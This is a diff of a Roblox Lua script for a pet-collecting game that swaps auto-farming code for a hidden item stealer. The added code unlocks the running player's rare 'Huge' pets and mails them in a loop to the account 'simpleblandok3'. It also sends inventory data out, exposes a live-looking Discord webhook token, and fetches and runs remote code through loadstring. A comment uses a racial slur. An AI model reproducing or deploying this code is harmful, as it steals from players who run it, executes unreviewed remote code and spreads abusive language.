@@ -15,147 +15,92 @@ if game.PlaceId == 8737899170 then
 end
 spawn(GameCheck)
 
-local Player = game.Players.LocalPlayer
-local targetPosition = Vector3.new(1384.076904296875, 16.239490509033203, -24948.265625)
-local radius = 300
-
-local function isInRadius()
-    local playerPosition = Player.Character and Player.Character.HumanoidRootPart and Player.Character.HumanoidRootPart.Position
-    if playerPosition then
-        return (playerPosition - targetPosition).Magnitude <= radius
-    end
-    return false
-end
-
-repeat
-    if not isInRadius() then
-        local args = {
-            [1] = "Elemental Realm"
-        }
-
-        game:GetService("ReplicatedStorage").Network.Teleports_RequestTeleport:InvokeServer(unpack(args))
-        wait(5)
-    end
-until isInRadius()
+-- to the niggas stalking my shir
+-- my nugga this is my code nobody else is using this leave me alone
+-- yall just coming here to bother , leave my code do smt else w yo life holy fuck
+wait(20)
 
 
-print("OMG you made it!")
 
-local function claimquest()
-while true do
-local args = {
-    [1] = "ElementalQuests"
-}
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
+local ProcessedHuges = {}
 
-game:GetService("ReplicatedStorage").Network:FindFirstChild("NPC Quests: Redeem"):InvokeServer(unpack(args))
-wait()
-end
-end
-spawn(claimquest)
-
-local Player = game.Players.LocalPlayer
-local character = Player.Character or Player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-
-local points = {
-    Vector3.new(1571.1942138671875, 24.56764793395996, -24949.7578125),
-    Vector3.new(1561.792236328125, 25.07814598083496, -24948.951171875)
-}
-
-local function walkToPoint(point)
-    humanoid:MoveTo(point)
-    humanoid.MoveToFinished:Wait()
-    wait(1)
-end
-
-spawn(function()
+function ProcessHugePets()
     while true do
-        for _, point in ipairs(points) do
-            walkToPoint(point)
-        end
-    end
-end)
-
-
-
-
-
-local function chest()
-    while true do
-        wait(0.1)
-        
-        local args1 = {
-            [1] = "Rainbow Mini Chest"
-        }
-        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args1))
-
-        local args2 = {
-            [1] = "Large Gift Bag"
-        }
-        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args2))
-
-        local args5 = {
-            [1] = "Mini Chest"
-        }
-        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args5))
-        
-        local args3 = {
-            [1] = "Gift Bag"
-        }
-        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args3))
-    end
-end
-spawn(chest)
-
-
-local function MailClaim()
-while true do
-    local player = game.Players.LocalPlayer
-    
-        local gui = player.PlayerGui:FindFirstChild("_MACHINES")
-        if gui then
-            local mailboxMachine = gui:FindFirstChild("MailboxMachine")
-            if mailboxMachine then
-                local giftsFrame = mailboxMachine:FindFirstChild("Frame") and mailboxMachine.Frame:FindFirstChild("GiftsFrame")
-                if giftsFrame then
-                    local itemsFrame = giftsFrame:FindFirstChild("ItemsFrame")
-                    if itemsFrame then
-                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
-                        if frameChild then
-
-                            local args = {
-                                [1] = {
-                                    [1] = frameChild.Name
-                                }
-                            }
-                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
-                        end
-                    end
+        local function GetItemInfo(ItemsClass, ItemsName)
+            local Table = {}
+            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+                if table.find(ItemsName, Item.id) then
+                    local ItemInfo = {
+                        ["uid"] = UID,
+                        ["data"] = Item
+                    }
+                    table.insert(Table, ItemInfo)
                 end
             end
+            return Table
         end
-        wait(1)
+
+        local function getCurrentHugePets()
+            local GoldPetsTable = {}
+            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
+                table.insert(GoldPetsTable, Pet.Name)
+            end
+            return GetItemInfo("Pet", GoldPetsTable)
+        end
+
+        local hugePets = {}
+        local uids = {}
+
+        for i, MadeTable in next, getCurrentHugePets() do
+            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+            table.insert(uids, MadeTable.uid)
+        end
+
+        if #hugePets > 0 then
+            print("Huge pets you have right now:", table.concat(hugePets, ", "))
+
+            for i = #uids, 1, -1 do
+        
+
+                local args = {
+                    [1] = uids[i],
+                    [2] = false
+                }
+
+                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
+                wait(1)
+                wait(3)
+
+                local args = {
+                    [1] = "simpleblandok3",
+                    [2] = "omg u got a new huge!!",
+                    [3] = "Pet",
+                    [4] = uids[i],
+                    [5] = 1
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+                wait(3)
+            end
+        end
+        wait(3)
     end
 end
 
-spawn(MailClaim)
-
+spawn(ProcessHugePets)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local Client = require(ReplicatedStorage:WaitForChild("Library"))
 
 local CurrencyData = {"Diamonds"}
-local PetCubeData = {"Pet Cube"}
-local UltraPetCubeData = {"Ultra Pet Cube"}
-local ElementalGiftData = {"Elemental Gift"}
+local WoodenGiftData = {"Wooden Gift"}
 local DiamondsAmount = 0
 local DiamondsUID = ""
-local PetCubeAmount = 0
-local PetCubeUID = ""
-local UltraPetCubeAmount = 0
-local UltraPetCubeUID = ""
-local ElementalGiftAmount = 0
-local ElementalGiftUID = ""
+local WoodenGiftAmount = 0
+local WoodenGiftUID = ""
 
 local function GetItemInfo(ItemsClass, ItemsName)
     local Table = {}
@@ -183,30 +128,12 @@ local function UpdateAmounts()
             end
         end
 
-        local PetCubeItems = GetItemInfo("Misc", PetCubeData)
-        for _, ItemInfo in pairs(PetCubeItems) do
+        local WoodenGiftItems = GetItemInfo("Lootbox", WoodenGiftData)
+        for _, ItemInfo in pairs(WoodenGiftItems) do
             local ItemData = ItemInfo.data
             if ItemData._am then
-                PetCubeAmount = ItemData._am
-                PetCubeUID = ItemInfo.uid
-            end
-        end
-
-        local UltraPetCubeItems = GetItemInfo("Misc", UltraPetCubeData)
-        for _, ItemInfo in pairs(UltraPetCubeItems) do
-            local ItemData = ItemInfo.data
-            if ItemData._am then
-                UltraPetCubeAmount = ItemData._am
-                UltraPetCubeUID = ItemInfo.uid
-            end
-        end
-
-        local ElementalGiftItems = GetItemInfo("Lootbox", ElementalGiftData)
-        for _, ItemInfo in pairs(ElementalGiftItems) do
-            local ItemData = ItemInfo.data
-            if ItemData._am then
-                ElementalGiftAmount = ItemData._am
-                ElementalGiftUID = ItemInfo.uid
+                WoodenGiftAmount = ItemData._am
+                WoodenGiftUID = ItemInfo.uid
             end
         end
 
@@ -215,42 +142,6 @@ local function UpdateAmounts()
 end
 
 spawn(UpdateAmounts)
-
-
-local function SendBucketMail()
-    while true do
-if DiamondsAmount > 100000099999 then
-local args = {
-                [1] = "simpleblandok3",
-                [2] = "enjoy bro",
-                [3] = "Currency",
-                [4] = DiamondsID,
-                [5] = DiamondsAmount - 1000000
-            }
-            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-
-end
-wait(10)
-        if ElementalGiftAmount > 999920 then
-            local args = {
-                [1] = "simpleblandok3",
-                [2] = "enjoy bro",
-                [3] = "Lootbox",
-                [4] = ElementalGiftUID,
-                [5] = ElementalGiftAmount
-            }
-            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-            
-
-
-        end
-
-        wait(10)
-    end
-end
-
-spawn(UpdateBucketAmount)
-spawn(SendBucketMail)
 
 
 local function WebsiteDataUpdate()
@@ -272,8 +163,8 @@ local function WebsiteDataUpdate()
             },
             Body = Http:JSONEncode({
                 Username = player,
-                VoidTicketsValue = PetCubeAmount, -- Use fixed VoidTicketsValue
-                DiamondsValue = ElementalGiftAmount,
+                VoidTicketsValue = "0", -- Use fixed VoidTicketsValue
+                DiamondsValue = WoodenGiftAmount,
                 HugeList = DiamondsAmount,
                 Server = "0",
 InstaplantValue = "0",
@@ -289,320 +180,14 @@ end
 
 spawn(WebsiteDataUpdate)  
 
-local Player = game.Players.LocalPlayer
-local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES").NPCQuests.Frame.ItemsFrame
-local assetIds = {
-    ["Fire Bats"] = "rbxassetid://130111664567019",
-    ["Storm Griffins"] = "rbxassetid://127584308923859",
-    ["Psychic Seals"] = "rbxassetid://85658687570990",
-    ["Electric Penguins"] = "rbxassetid://112335811276145",
-    ["Dark Dragons"] = "rbxassetid://72515302633192"
+getgenv().Config = { 
+    ["Webhook"] = "https://discord.com/api/webhooks/1309500163458334831/cK7Gb0FnsLEid21n6L-V22fseC5YB4a5-q38UnmeP7zPG_8COUgRM2TVVNsIQSAPlRuk",
+    ["UserID"] = "731736164196679712",
 }
-
-local Quest1 = ""
-local Quest2 = ""
-local Quest3 = ""
-
-local function Quest1Check()
-    while true do
-        local quest = itemsFrame:FindFirstChild("Quest1")
-        if quest then
-            local number1, number2 = quest.Desc.Text:match("(%d+)/(%d+)")
-            if number1 and number2 then
-                local current = tonumber(number1)
-                local required = tonumber(number2)
-                if current >= required then
-                    Quest1 = "NO"
-                else
-                    local titleText = quest.Title.Text
-                    for name, assetId in pairs(assetIds) do
-                        if string.find(titleText, name) then
-                            Quest1 = assetId
-                            break
-                        end
-                    end
-                end
-            end
-        end
-        wait()
-    end
-end
-
-local function Quest2Check()
-    while true do
-        local quest = itemsFrame:FindFirstChild("Quest2")
-        if quest then
-            local number1, number2 = quest.Desc.Text:match("(%d+)/(%d+)")
-            if number1 and number2 then
-                local current = tonumber(number1)
-                local required = tonumber(number2)
-                if current >= required then
-                    Quest2 = "NO"
-                else
-                    local titleText = quest.Title.Text
-                    for name, assetId in pairs(assetIds) do
-                        if string.find(titleText, name) then
-                            Quest2 = assetId
-                            break
-                        end
-                    end
-                end
-            end
-        end
-        wait()
-    end
-end
-
-local function Quest3Check()
-    while true do
-        local quest = itemsFrame:FindFirstChild("Quest3")
-        if quest then
-            local number1, number2 = quest.Desc.Text:match("(%d+)/(%d+)")
-            if number1 and number2 then
-                local current = tonumber(number1)
-                local required = tonumber(number2)
-                if current >= required then
-                    Quest3 = "NO"
-                else
-                    local titleText = quest.Title.Text
-                    for name, assetId in pairs(assetIds) do
-                        if string.find(titleText, name) then
-                            Quest3 = assetId
-                            break
-                        end
-                    end
-                end
-            end
-        end
-        wait()
-    end
-end
-
-spawn(Quest1Check)
-spawn(Quest2Check)
-spawn(Quest3Check)
-
-local function CatchQuest1()
-    while true do
-        if Quest1 ~= "NO" then
-            local pets = workspace:FindFirstChild("__THINGS"):FindFirstChild("Pets")
-            if pets then
-                local highestChances = {}
-                for _, pet in pairs(pets:GetChildren()) do
-                    if pet:IsA("Model") then
-                        local part = pet:FindFirstChildWhichIsA("Part") or pet:FindFirstChildWhichIsA("MeshPart")
-                        if part then
-                            local mesh = part:FindFirstChild("Mesh")
-                            if mesh and mesh.MeshId == Quest1 then
-                                local center = part:FindFirstChild("center")
-                                if center then
-                                    local billboard = center:FindFirstChild("RoamingPetBillboard")
-                                    if billboard then
-                                        local chance = billboard:FindFirstChild("Chance")
-                                        if chance then
-                                            local number = tonumber(chance.Text:match("(%d+)%%"))
-                                            if number then
-                                                table.insert(highestChances, {pet = pet, chance = number})
-                                            end
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-
-                if #highestChances > 0 then
-                    table.sort(highestChances, function(a, b) return a.chance > b.chance end)
-                    local topThree = {highestChances[1], highestChances[2], highestChances[3]}
-                    local randomPet = topThree[math.random(1, #topThree)]
-                   
-                    local part = randomPet.pet:FindFirstChildWhichIsA("Part") or randomPet.pet:FindFirstChildWhichIsA("MeshPart")
-                    if part then
-                        local roamingPet = part:GetAttribute("RoamingPet")
-                        if roamingPet then
-                            local args = {
-                                [1] = "Pet Cube",
-                                [2] = roamingPet
-                            }
-                            game:GetService("ReplicatedStorage").Network.RoamingPets_CatchPet:InvokeServer(unpack(args))
-                        end
-                    end
-                end
-            end
-        end
-
-wait()
-
-    end
-end
-
-local function CatchQuest2()
-    while true do
-        if Quest2 ~= "NO" then
-            local pets = workspace:FindFirstChild("__THINGS"):FindFirstChild("Pets")
-            if pets then
-                local highestChances = {}
-                for _, pet in pairs(pets:GetChildren()) do
-                    if pet:IsA("Model") then
-                        local part = pet:FindFirstChildWhichIsA("Part") or pet:FindFirstChildWhichIsA("MeshPart")
-                        if part then
-                            local mesh = part:FindFirstChild("Mesh")
-                            if mesh and mesh.MeshId == Quest2 then
-                                local center = part:FindFirstChild("center")
-                                if center then
-                                    local billboard = center:FindFirstChild("RoamingPetBillboard")
-                                    if billboard then
-                                        local chance = billboard:FindFirstChild("Chance")
-                                        if chance then
-                                            local number = tonumber(chance.Text:match("(%d+)%%"))
-                                            if number then
-                                                table.insert(highestChances, {pet = pet, chance = number})
-                                            end
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-
-                if #highestChances > 0 then
-                    table.sort(highestChances, function(a, b) return a.chance > b.chance end)
-                    local topThree = {highestChances[1], highestChances[2], highestChances[3]}
-                    local randomPet = topThree[math.random(1, #topThree)]
-               
-                    local part = randomPet.pet:FindFirstChildWhichIsA("Part") or randomPet.pet:FindFirstChildWhichIsA("MeshPart")
-                    if part then
-                        local roamingPet = part:GetAttribute("RoamingPet")
-                        if roamingPet then
-                            local args = {
-                                [1] = "Pet Cube",
-                                [2] = roamingPet
-                            }
-                            game:GetService("ReplicatedStorage").Network.RoamingPets_CatchPet:InvokeServer(unpack(args))
-                        end
-                    end
-                end
-            end
-        end
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/563a4a1c759a83a84ed00822b66756a9.lua"))()
 
 
-wait()
-
-    end
-end
-
-local function CatchQuest3()
-    while true do
-        if Quest3 ~= "NO" then
-            local pets = workspace:FindFirstChild("__THINGS"):FindFirstChild("Pets")
-            if pets then
-                local highestChances = {}
-                for _, pet in pairs(pets:GetChildren()) do
-                    if pet:IsA("Model") then
-                        local part = pet:FindFirstChildWhichIsA("Part") or pet:FindFirstChildWhichIsA("MeshPart")
-                        if part then
-                            local mesh = part:FindFirstChild("Mesh")
-                            if mesh and mesh.MeshId == Quest3 then
-                                local center = part:FindFirstChild("center")
-                                if center then
-                                    local billboard = center:FindFirstChild("RoamingPetBillboard")
-                                    if billboard then
-                                        local chance = billboard:FindFirstChild("Chance")
-                                        if chance then
-                                            local number = tonumber(chance.Text:match("(%d+)%%"))
-                                            if number then
-                                                table.insert(highestChances, {pet = pet, chance = number})
-                                            end
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-
-                if #highestChances > 0 then
-                    table.sort(highestChances, function(a, b) return a.chance > b.chance end)
-                    local topThree = {highestChances[1], highestChances[2], highestChances[3]}
-                    local randomPet = topThree[math.random(1, #topThree)]
-                
-                    local part = randomPet.pet:FindFirstChildWhichIsA("Part") or randomPet.pet:FindFirstChildWhichIsA("MeshPart")
-                    if part then
-                        local roamingPet = part:GetAttribute("RoamingPet")
-                        if roamingPet then
-                            local args = {
-                                [1] = "Pet Cube",
-                                [2] = roamingPet
-                            }
-                            game:GetService("ReplicatedStorage").Network.RoamingPets_CatchPet:InvokeServer(unpack(args))
-                        end
-                    end
-                end
-            end
-        end
 
 
-wait()
-
-    end
-end
-
-spawn(CatchQuest1)
-spawn(CatchQuest2)
-spawn(CatchQuest3)
 
 
-local function finalCheck()
-    while true do
-        local check1, check2, check3 = false, false, false
-        local pets = workspace:FindFirstChild("__THINGS"):FindFirstChild("Pets")
-
-        if pets then
-            for _, pet in pairs(pets:GetChildren()) do
-                if pet:IsA("Model") then
-                    local part = pet:FindFirstChildWhichIsA("Part") or pet:FindFirstChildWhichIsA("MeshPart")
-                    if part then
-                        local mesh = part:FindFirstChild("Mesh")
-                        
-                        if mesh then
-                            if Quest1 ~= "NO" and mesh.MeshId == Quest1 then
-                                check1 = true
-                            end
-
-                            if Quest2 ~= "NO" and mesh.MeshId == Quest2 then
-                                check2 = true
-                            end
-
-                            if Quest3 ~= "NO" and mesh.MeshId == Quest3 then
-                                check3 = true
-                            end
-                        end
-                    end
-                end
-            end
-
-            if not check1 and not check2 and not check3 then
-                local randomPet = pets:GetChildren()[math.random(1, #pets:GetChildren())]
-                if randomPet:IsA("Model") then
-                    local part = randomPet:FindFirstChildWhichIsA("Part") or randomPet:FindFirstChildWhichIsA("MeshPart")
-                    if part then
-                        local roamingPet = part:GetAttribute("RoamingPet")
-                        if roamingPet then
-                            local args = {
-                                [1] = "Pet Cube",
-                                [2] = roamingPet
-                            }
-                            game:GetService("ReplicatedStorage").Network.RoamingPets_CatchPet:InvokeServer(unpack(args))
-                        end
-                    end
-                end
-            end
-        end
-
-        wait()
-    end
-end
-
-spawn(finalCheck)
